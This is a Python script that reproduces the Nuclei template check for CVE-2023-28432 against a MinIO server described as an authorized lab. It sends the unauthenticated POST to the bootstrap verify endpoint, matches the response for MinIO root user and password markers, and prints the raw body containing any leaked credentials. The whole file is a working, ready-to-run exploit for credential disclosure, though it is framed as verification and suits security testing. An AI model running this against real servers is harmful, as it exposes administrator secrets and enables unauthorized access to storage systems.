#!/usr/bin/env python3
"""Reproduce the CVE-2023-28432 Nuclei check against an authorized MinIO lab."""

from __future__ import annotations

import argparse
import sys
import urllib.error
import urllib.request


PATH = "/minio/bootstrap/v1/verify"
EXPECTED_BODY_MARKERS = (
    '"MINIO_ROOT_PASSWORD":',
    '"MINIO_ROOT_USER":',
    '"MinioEnv":',
)


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Send the CVE-2023-28432 verification request to a MinIO lab."
    )
    parser.add_argument(
        "--url",
        default="http://127.0.0.1:9000",
        help="Authorized MinIO API base URL (default: http://127.0.0.1:9000)",
    )
    parser.add_argument("--timeout", type=float, default=10.0, help="Request timeout in seconds")
    args = parser.parse_args()

    target = args.url.rstrip("/") + PATH
    request = urllib.request.Request(
        target,
        data=b"",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        method="POST",
    )

    try:
        with urllib.request.urlopen(request, timeout=args.timeout) as response:
            status = response.status
            headers = response.headers
            body = response.read()
    except urllib.error.HTTPError as error:
        # urllib raises HTTPError for non-2xx responses; it still contains the response.
        status = error.code
        headers = error.headers
        body = error.read()
    except (urllib.error.URLError, TimeoutError, ValueError) as error:
        print(f"Request failed: {error}", file=sys.stderr)
        return 2

    body_text = body.decode("utf-8", errors="replace")
    content_type = headers.get("Content-Type", "") if headers else ""
    matched_markers = [marker for marker in EXPECTED_BODY_MARKERS if marker in body_text]

    status_match = status == 200
    content_type_match = "text/plain" in content_type
    body_match = bool(matched_markers)
    template_match = status_match and content_type_match and body_match

    print(f"Target: {target}", file=sys.stderr)
    print(
        f"HTTP status: {status} ({'match' if status_match else 'no match; expected 200'})",
        file=sys.stderr,
    )
    print(
        "Content-Type: "
        f"{content_type or '(missing)'} "
        f"({'match' if content_type_match else 'no match; expected text/plain'})",
        file=sys.stderr,
    )
    print(
        "Body marker: "
        + (", ".join(matched_markers) if matched_markers else "no expected marker found"),
        file=sys.stderr,
    )
    print(f"Nuclei matcher result: {'MATCH' if template_match else 'NO MATCH'}", file=sys.stderr)
    # Keep stdout as the raw response body so it can be piped directly to jq.
    print(body_text, end="" if body_text.endswith("\n") else "\n")

    return 0 if template_match else 1


if __name__ == "__main__":
    raise SystemExit(main())
